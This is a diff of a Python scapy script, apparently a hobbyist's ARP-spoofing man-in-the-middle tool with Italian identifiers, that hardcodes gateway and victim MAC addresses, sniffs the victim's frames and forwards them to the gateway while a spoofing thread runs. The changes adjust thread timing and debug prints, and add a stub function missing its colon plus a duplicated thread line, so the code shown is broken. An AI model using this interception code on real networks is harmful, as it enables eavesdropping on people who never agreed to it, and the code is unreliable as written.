@@ -2,6 +2,7 @@ from scapy.all import *
 from scapy.layers.inet import Ether, IP, TCP
 import time
 import threading
+import decimal 
 
 gateway_mac='52:54:00:88:15:b6'
 victim_mac='00:e0:4c:36:73:52'
@@ -39,8 +40,10 @@ def buffered_sniff(pckt):
 	if (pckt[Ether].dst==my_mac and pckt[Ether].src==victim_mac):
 		#semaforo.acquire()	
 		if invia_a_gatewayy.isAlive():
+			print("killo")
 			invia_a_gatewayy.do_run=False
 			invia_a_gatewayy.join()
+			
 		pckt[Ether].dst = gateway_mac
 		pckt_buffer_victim.append(pckt)
 
@@ -87,11 +90,17 @@ def invia_a_gateway():
 	global t
 	global invia_a_gateway
 	
-	time_wait=0.1
+	time_wait=0.2
 	tempo=time.time()
-	while tempo-time.time()<time_wait and getattr(invia_a_gatewayy, "do_run", True):
+	
+	while getattr(invia_a_gatewayy, "do_run", True):
+		tempo_2 = time.time()
+		if tempo_2 - tempo >=time_wait:
+			print("Esco scaditp")
+			break
 		pass
-	if getattr(invia_a_gatewayy, "do_run", False):
+	
+	if getattr(invia_a_gatewayy, "do_run", True)==False:
 		print("Esco")
 		return
 	#semaforo_2.acquire()
@@ -103,7 +112,7 @@ def invia_a_gateway():
 	#semaforo.acquire()
 	for i in range(len(pckt_buffer_victim)):
 		sendp(pckt_buffer_victim[i],verbose=0)
-		chi_e_h()
+		#chi_e_h()
 		print("inviata replica a gateway %d",i)
 	pckt_buffer_victim*=0
 	semaforo.release()
@@ -114,6 +123,8 @@ def invia_a_gateway():
 	#semaforo_2.release()
 	#print("Esco")
 
+def invia_a_vittima()
+	
 
 def sono_h():
 	#print("entro")
@@ -137,6 +148,7 @@ def arp_spoof():
 print("UlTiMaTe ArP SpOoFiNg\n")
 arp_spoof = threading.Thread(target=arp_spoof)
 t = threading.Thread(target=sono_h)
+invia_a_gatewayy= threading.Thread(target=invia_a_gateway)
 invia_a_gatewayy= threading.Thread(target=invia_a_gateway)
 t.start()
 arp_spoof.start()
